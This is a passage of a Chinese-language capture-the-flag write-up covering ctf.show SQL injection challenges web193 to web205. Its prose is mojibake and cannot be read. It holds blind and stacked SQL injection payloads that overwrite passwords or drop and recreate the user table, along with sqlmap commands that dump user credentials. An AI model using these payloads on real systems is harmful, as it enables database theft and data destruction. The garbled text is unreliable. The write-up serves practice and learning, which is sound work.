exit()</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œè¿˜æ˜¯ç®€å•æä¸€ä¸‹leftå’Œrightè¿™é‡Œçš„å†™æ³•ï¼š<br>right<br>ä»å³è¾¹å¼€å§‹æˆªå–,é…åˆasciiä½¿ç”¨.<br>ascii(â€˜strâ€™)è¿”å›å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç <br>ascii(right(â€˜abcâ€™,2))= 97ç›¸å½“äº ascii(â€˜bcâ€™)=97<br>left<br>ä»å·¦è¾¹å¼€å§‹æˆªå–,ç”¨reverseåè½¬<br>ascii(reverse(left(â€˜abcâ€™,2))) = 97 ç›¸å½“äº ascii(â€˜bcâ€™)=97<br>midå’Œstrsubæ•ˆæœä¸€æ ·,ä»£ç åŒä¸Š<br>è¿™æ˜¯ä¸€ç§è§£æ³•ï¼Œè¿˜å¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and ((left((select database()),&#123;&#125;)=&#x27;</span>&#123;&#125;<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure><h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><p>leftå’Œrightè¢«æ»¤æ‰äº†<br>è¿˜èƒ½ç”¨midã€‚<br>ä¸Šé¢˜ç›¸åŒè„šæœ¬å³å¯ã€‚</p><h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h3 id="å †å æ³¨å…¥-a-0åŒ¹é…æ‰€æœ‰å¼€å¤´ä¸æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—"><a href="#å †å æ³¨å…¥-a-0åŒ¹é…æ‰€æœ‰å¼€å¤´ä¸æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—" class="headerlink" title="å †å æ³¨å…¥ a=0åŒ¹é…æ‰€æœ‰å¼€å¤´ä¸æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—"></a>å †å æ³¨å…¥ <strong>a=0åŒ¹é…æ‰€æœ‰å¼€å¤´ä¸æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—</strong></h3><blockquote><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p></blockquote><p>ä»€ä¹ˆæ˜¯å †å æ³¨å…¥ï¼Œæˆ‘ä¸€å¬è¿™åå­—ä¹Ÿæ‡µäº†ä¸€ä¸‹ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œå°±æ˜¯æœ«å°¾åŠ <code>ï¼›</code>é“¾æ¥ä¸‹ä¸€ä¸ªå‘½ä»¤è¯­å¥ã€‚ä½¿å…¶ä¸€èµ·æ‰§è¡Œã€‚<br>ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨åå¼•å·æ‰§è¡Œã€‚<br>é¢˜ç›®é‡Œæç¤ºè¯´ç™»é™†æˆåŠŸå³å¯å¾—åˆ°flagï¼Œé‚£ä¹ˆå°†æ•°æ®çš„å¯†ç åˆ‡æ¢ä¸ºè‡ªå·±çš„å¯†ç å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="number">0</span>]==$password)&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ç”±äºsqlçš„çŸ¥è¯†å°±æ˜¯ä¸€å¨ï¼Œè¿˜æ˜¯å…ˆæŸ¥äº†ä¸€ä¸‹å†™æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name</span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥å†™å‡ºpayload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br><span class="line">ç„¶åä¸Šä¼ </span><br><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>å°±ä¼šè¿”å›flagã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689160962992-9e51c7f1-4f6c-428c-ba4f-5a04d65443df.png" alt="image.png"><br><strong>ï¼ˆusername=0è¿™ä¸ªåšæ³•åœ¨web188ä¸­æœ‰æåˆ°ï¼Œå°±æ˜¯åŒ¹é…æ‰€æœ‰å¼€å¤´ä¸æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—0ï¼‰</strong><br>æˆ–è€…ï¼Œè¿˜å¯ä»¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x61646d696e</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">ç„¶åè´¦å·<span class="number">0x61646d696e</span>å’Œå¯†ç <span class="number">123456</span></span><br></pre></td></tr></table></figure><h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p>é™åˆ¶äº†ç”¨æˆ·åé•¿åº¦ã€‚çœ‹äº†wpæ‰å‘ç°ï¼Œè¿™é‡Œçš„selectæ²¡è¢«è¿‡æ»¤ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689163102786-54c21ea0-9ae6-4f5c-bb7d-81ba8af98594.png" alt="image.png"><br>å•Šè¿™<br>payloadï¼š<code>username=1;select(1)&amp;password=1</code>è®©selectçš„å€¼è¦†ç›–ç»™éœ€è¦æ¯”å¯¹çš„å‚æ•°ï¼Œç„¶åå†ä¼ å…¥ä½ éœ€è¦çš„å¯†ç ã€‚</p><h1 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h1><h3 id="show-tablesæŸ¥çœ‹è¡¨å-drop-createåˆ è¡¨å’Œåˆ›å»ºè¡¨-insertæ’å…¥æ•°æ®"><a href="#show-tablesæŸ¥çœ‹è¡¨å-drop-createåˆ è¡¨å’Œåˆ›å»ºè¡¨-insertæ’å…¥æ•°æ®" class="headerlink" title="show tablesæŸ¥çœ‹è¡¨å drop\createåˆ è¡¨å’Œåˆ›å»ºè¡¨ insertæ’å…¥æ•°æ®"></a>show tablesæŸ¥çœ‹è¡¨å drop\createåˆ è¡¨å’Œåˆ›å»ºè¡¨ insertæ’å…¥æ•°æ®</h3><h2 id="æ–¹æ³•ä¸€-show-tables"><a href="#æ–¹æ³•ä¸€-show-tables" class="headerlink" title="æ–¹æ³•ä¸€ show tables"></a>æ–¹æ³•ä¸€ show tables</h2><p>show tablesè·å–è¡¨åçš„ç»“æœé›†ã€‚<br>ç”±é¢˜ç›®å¯çŸ¥ï¼Œctfshow_useråœ¨å…¶ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦è¿™æ ·ä¼ å€¼å³å¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span>;<span class="keyword">show</span> tables<span class="operator">&amp;</span>password<span class="operator">=</span>ctfshow_user</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•äºŒ-åˆ è¡¨-æŠŠä»–å˜æˆè‡ªå·±çš„æ ·å­"><a href="#æ–¹æ³•äºŒ-åˆ è¡¨-æŠŠä»–å˜æˆè‡ªå·±çš„æ ·å­" class="headerlink" title="æ–¹æ³•äºŒ åˆ è¡¨ æŠŠä»–å˜æˆè‡ªå·±çš„æ ·å­"></a>æ–¹æ³•äºŒ åˆ è¡¨ æŠŠä»–å˜æˆè‡ªå·±çš„æ ·å­</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">drop</span> <span class="keyword">table</span> ctfshow_user;<span class="keyword">create</span> <span class="keyword">table</span> ctfshow_user(`username` <span class="type">varchar</span>(<span class="number">100</span>),`pass` <span class="type">varchar</span>(<span class="number">100</span>));<span class="keyword">insert</span> ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è´¦å·å¯†ç è¾“å…¥1å’Œ1å³å¯<br>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥insertæ’å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">insert</span>  ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">password:<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="SQLçŸ¥è¯†è¡¥å……-dropã€createã€insert"><a href="#SQLçŸ¥è¯†è¡¥å……-dropã€createã€insert" class="headerlink" title="SQLçŸ¥è¯†è¡¥å……-dropã€createã€insert"></a>SQLçŸ¥è¯†è¡¥å……-dropã€createã€insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> OBJECT_TYPE [IF <span class="keyword">EXISTS</span>] object_name;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `OBJECT_TYPE`ï¼šæŒ‡å®šè¦åˆ é™¤çš„å¯¹è±¡ç±»å‹ï¼Œå¦‚`<span class="keyword">TABLE</span>`ï¼ˆè¡¨ï¼‰ã€`<span class="keyword">VIEW</span>`ï¼ˆè§†å›¾ï¼‰ç­‰ã€‚</span><br><span class="line"><span class="operator">-</span> `IF <span class="keyword">EXISTS</span>`ï¼ˆå¯é€‰ï¼‰ï¼šå¦‚æœåŠ ä¸Šæ­¤é€‰é¡¹ï¼Œå¦‚æœè¦åˆ é™¤çš„å¯¹è±¡ä¸å­˜åœ¨ï¼Œåˆ™ä¸ä¼šå¼•å‘é”™è¯¯ã€‚</span><br><span class="line"><span class="operator">-</span> `object_name`ï¼šæŒ‡å®šè¦åˆ é™¤çš„å¯¹è±¡çš„åç§°ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> OBJECT_TYPE object_name</span><br><span class="line">(</span><br><span class="line">    column1 data_type,</span><br><span class="line">    column2 data_type,</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `OBJECT_TYPE`ï¼šæŒ‡å®šè¦åˆ›å»ºçš„å¯¹è±¡ç±»å‹ï¼Œå¦‚`<span class="keyword">TABLE</span>`ï¼ˆè¡¨ï¼‰ã€`<span class="keyword">VIEW</span>`ï¼ˆè§†å›¾ï¼‰ç­‰ã€‚</span><br><span class="line"><span class="operator">-</span> `object_name`ï¼šæŒ‡å®šè¦åˆ›å»ºçš„å¯¹è±¡çš„åç§°ã€‚</span><br><span class="line"><span class="operator">-</span> `column1 data_type, column2 data_type, ...`ï¼šæŒ‡å®šå¯¹è±¡çš„åˆ—åŠå…¶æ•°æ®ç±»å‹ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, ...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2, ...);</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `table_name`ï¼šæŒ‡å®šè¦æ’å…¥æ•°æ®çš„è¡¨çš„åç§°ã€‚</span><br><span class="line"><span class="operator">-</span> `column1, column2, ...`ï¼šæŒ‡å®šè¦æ’å…¥æ•°æ®çš„åˆ—ã€‚</span><br><span class="line"><span class="operator">-</span> `value1, value2, ...`ï¼šæŒ‡å®šè¦æ’å…¥çš„å€¼ï¼Œä¸åˆ—ä¸€ä¸€å¯¹åº”ã€‚</span><br></pre></td></tr></table></figure><h1 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h1><p>ç»§ç»­ç”¨ä¸Šé¢˜çš„insertæ’å…¥å³å¯ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">insert</span>  ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">password:<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="web199ã€web200"><a href="#web199ã€web200" class="headerlink" title="web199ã€web200"></a>web199ã€web200</h1><p>æ‹¬å·è¢«ç¦ç”¨äº†ï¼Œé‚£å°±ç”¨é‚£ä¸ªshow tables</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h3 id="sqlmapGETæ³¨å…¥-referer"><a href="#sqlmapGETæ³¨å…¥-referer" class="headerlink" title="sqlmapGETæ³¨å…¥ referer"></a>sqlmapGETæ³¨å…¥ referer</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">å½“å‰æ•°æ®åº“</span><br><span class="line">å‚æ•°ï¼š<span class="comment">--current-db</span></span><br><span class="line">è¿”è¿˜å½“å‰è¿æ¥çš„æ•°æ®åº“ã€‚</span><br><span class="line"></span><br><span class="line">åˆ—ä¸¾æ•°æ®åº“è¡¨</span><br><span class="line">å‚æ•°ï¼š<span class="comment">--tables,--exclude-sysdbs,-D</span></span><br><span class="line">å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰æ•°æ®åº“è¡¨ä¿¡æ¯çš„è¡¨ä¸­çš„æ—¶å€™ï¼Œå³å¯åˆ—å‡ºä¸€ä¸ªç‰¹å®šæ•°æ®çš„æ‰€æœ‰è¡¨ã€‚</span><br><span class="line">å¦‚æœä½ ä¸æä¾›<span class="operator">-</span>Då‚æ•°æ¥åˆ—æŒ‡å®šçš„ä¸€ä¸ªæ•°æ®çš„æ—¶å€™ï¼Œsqlmapä¼šåˆ—å‡ºæ•°æ®åº“æ‰€æœ‰åº“çš„æ‰€æœ‰è¡¨ã€‚</span><br><span class="line"><span class="comment">--exclude-sysdbså‚æ•°æ˜¯æŒ‡åŒ…å«äº†æ‰€æœ‰çš„ç³»ç»Ÿæ•°æ®åº“ã€‚</span></span><br><span class="line">éœ€è¦æ³¨æ„çš„æ˜¯åœ¨Oracleä¸­ä½ éœ€è¦æä¾›çš„æ˜¯TABLESPACE_NAMEè€Œä¸æ˜¯æ•°æ®åº“åç§°ã€‚</span><br><span class="line"></span><br><span class="line">åˆ—ä¸¾æ•°æ®åº“è¡¨ä¸­çš„å­—æ®µ</span><br><span class="line">å‚æ•°ï¼š<span class="comment">--columns,-C,-T,-D</span></span><br><span class="line">å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰æ•°æ®åº“è¡¨ä¿¡æ¯çš„è¡¨ä¸­çš„æ—¶å€™ï¼Œå³å¯åˆ—å‡ºæŒ‡å®šæ•°æ®åº“è¡¨ä¸­çš„å­—æ®µï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ—å‡ºå­—æ®µçš„æ•°æ®ç±»å‹ã€‚</span><br><span class="line">å¦‚æœæ²¡æœ‰ä½¿ç”¨<span class="operator">-</span>Då‚æ•°æŒ‡å®šæ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¼šä½¿ç”¨å½“å‰æ•°æ®åº“ã€‚</span><br><span class="line"></span><br><span class="line">è·å–æ•´ä¸ªè¡¨çš„æ•°æ®</span><br><span class="line">å‚æ•°ï¼š<span class="comment">--dump,-C,-T,-D,--start,--stop,--first,--last</span></span><br><span class="line">å¦‚æœå½“å‰ç®¡ç†å‘˜æœ‰æƒé™è¯»å–æ•°æ®åº“å…¶ä¸­çš„ä¸€ä¸ªè¡¨çš„è¯ï¼Œé‚£ä¹ˆå°±èƒ½è·å–çœŸä¸ªè¡¨çš„æ‰€æœ‰å†…å®¹ã€‚</span><br><span class="line">ä½¿ç”¨<span class="operator">-</span>D,<span class="operator">-</span>Tå‚æ•°æŒ‡å®šæƒ³è¦è·å–å“ªä¸ªåº“çš„å“ªä¸ªè¡¨ï¼Œä¸é€‚ç”¨<span class="operator">-</span>Då‚æ•°æ—¶ï¼Œé»˜è®¤ä½¿ç”¨å½“å‰åº“ã€‚</span><br></pre></td></tr></table></figure><p>payloadï¼š<code>sqlmap -u http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/api/\?id\=1 --refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</code><br>è¿”å›å‡ºï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166554462-4a3c7438-52d5-4b6d-b87d-910192d93e48.png" alt="image.png"><br>ç„¶åç”¨payloadçˆ†è¡¨çˆ†è¯æ¡<br>çˆ†åº“ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166695514-becf0b5a-ebd9-4e7f-a93f-08e61f61a372.png" alt="image.png"><br>çˆ†è¡¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php -D ctfshow_web --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166764719-0fee533f-e0a8-4971-bd2d-a8ea49d132f4.png" alt="image.png"><br>çˆ†è¯æ¡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166806079-e9066b90-185d-4eee-a837-3c79ea26c08c.png" alt="image.png"><br>æŸ¥çœ‹å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162</span></span><br><span class="line"><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>sqlmap.php <span class="operator">-</span>D ctfshow_web <span class="operator">-</span>T ctfshow_user <span class="operator">-</span>C id,pass,username <span class="comment">--dump</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166915916-68f13c0c-13e8-47fd-90f4-fe5f87d32ff1.png" alt="image.png"></p><h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h3 id="sqlmapPOSTæ³¨å…¥-æ³¨æ„â€“refererå’Œâ€“data"><a href="#sqlmapPOSTæ³¨å…¥-æ³¨æ„â€“refererå’Œâ€“data" class="headerlink" title="sqlmapPOSTæ³¨å…¥ æ³¨æ„â€“refererå’Œâ€“data"></a>sqlmapPOSTæ³¨å…¥ æ³¨æ„â€“refererå’Œâ€“data</h3><p>æŠ“åŒ…ç”¨çš„è™½ç„¶æ˜¯getï¼Œä½†æ˜¯æç¤ºè¯´æ˜¯ç”¨postä¼ å‚ã€‚<br>é‚£å°±ç”¨postè¯•ä¸€ä¸‹ã€‚<br>æˆ‘ä¸ç†è§£è¿™ä¸ªrefererçš„ctf.showæ˜¯æ€ä¹ˆç¡®å®šçš„ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>c3420367<span class="number">-21</span>b9<span class="number">-4692</span><span class="number">-8570</span><span class="number">-1</span>ac73fb7a651.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span> <span class="comment">--data=&#x27;id=1&#x27; --refer=&#x27;ctf.show&#x27; --dbs</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://c3420367-21b9-4692-8570-1ac73fb7a651.challenge.ctf.show/api/ --data=<span class="string">&#x27;id=1&#x27;</span> --referer=<span class="string">&#x27;ctf.show&#x27;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689168116809-aecb017b-30da-4d98-8cf2-62ae2e821ebf.png" alt="image.png"></p><h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h3 id="â€“method-åˆ‡æ¢æ–¹å¼-PUTè¯·æ±‚"><a href="#â€“method-åˆ‡æ¢æ–¹å¼-PUTè¯·æ±‚" class="headerlink" title="â€“method åˆ‡æ¢æ–¹å¼ PUTè¯·æ±‚"></a>â€“method åˆ‡æ¢æ–¹å¼ PUTè¯·æ±‚</h3><p>æç¤ºâ€“methodåˆ‡æ¢æ–¹å¼ï¼Œä½¿ç”¨PUTæ–¹æ³•ï¼Œéœ€è¦åŠ ä¸ŠContent-Typeå¤´ï¼Œå¦åˆ™ä¼šå˜æˆè¡¨å•æäº¤ï¼š<br>æˆ‘çœŸçš„ä¸å¤ªç†è§£ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç›¸åŒå‚æ•° æˆ‘çš„å°±ä¸è¡Œï¼Œwpçš„å°±å¯ä»¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://3c00342b-19a7-4a23-aa48-e84c36c5bcef.challenge.ctf.show/api/index.php --refer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1</span></span><br><span class="line"><span class="string">&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><h2 id="PUTè¯·æ±‚"><a href="#PUTè¯·æ±‚" class="headerlink" title="PUTè¯·æ±‚"></a>PUTè¯·æ±‚</h2><p>PUTè¯·æ±‚çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p><ol><li><p>å®¢æˆ·ç«¯å‘é€PUTè¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œå¹¶æŒ‡å®šè¦æ›´æ–°çš„èµ„æºçš„URIï¼ˆç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼‰ã€‚</p></li><li><p>æœåŠ¡å™¨æ”¶åˆ°PUTè¯·æ±‚åï¼Œä¼šæ£€æŸ¥è¯·æ±‚å¤´ä¸­çš„Content-Typeå­—æ®µæ¥ç¡®å®šæ¥æ”¶çš„æ•°æ®æ ¼å¼ã€‚</p></li><li><p>æœåŠ¡å™¨æ ¹æ®è¯·æ±‚ä¸­æä¾›çš„æ•°æ®æ›´æ–°å¯¹åº”çš„èµ„æºã€‚å¦‚æœèµ„æºä¸å­˜åœ¨ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šæ ¹æ®è¯·æ±‚ä¸­çš„æ•°æ®åˆ›å»ºæ–°çš„èµ„æºã€‚</p></li><li><p>æœåŠ¡å™¨è¿”å›HTTPå“åº”ç ï¼ŒæŒ‡ç¤ºPUTè¯·æ±‚çš„å¤„ç†ç»“æœã€‚</p><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h3 id="â€“cookie"><a href="#â€“cookie" class="headerlink" title="â€“cookie"></a>â€“cookie</h3><p>å…ˆæŠ“åŒ…è·å–cookieå‚æ•°ï¼š<br><code>PHPSESSID=5mb3tupsgnxxxxxx; ctfshow=07cxxxxxxxxx</code><br>ç„¶åæ„å»ºpayload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://087527a8-18dc-4e85-984e-4f9a39590671.challenge.ctf.show/api/index.php --refer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=5mb3xxxxq7ajmjalma2rc; ctfshow=07cdfa7549bc3cxxx9edxxxxxxea&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h3 id="apié‰´æƒ-â€“safe-url-â€“safe-freq"><a href="#apié‰´æƒ-â€“safe-url-â€“safe-freq" class="headerlink" title="apié‰´æƒ â€“safe-url â€“safe-freq"></a>apié‰´æƒ â€“safe-url â€“safe-freq</h3><p>æ¯æ¬¡æŸ¥è¯¢è¯·æ±‚å¯ä»¥æ³¨æ„åˆ°éƒ½ä¼šè®¿é—®ç›®æ ‡ç½‘é¡µï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689169274466-380ecb13-009d-4bdd-a657-ee7081adc43b.png" alt="image.png"><br>éœ€è¦ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url è®¾ç½®åœ¨æµ‹è¯•ç›®æ 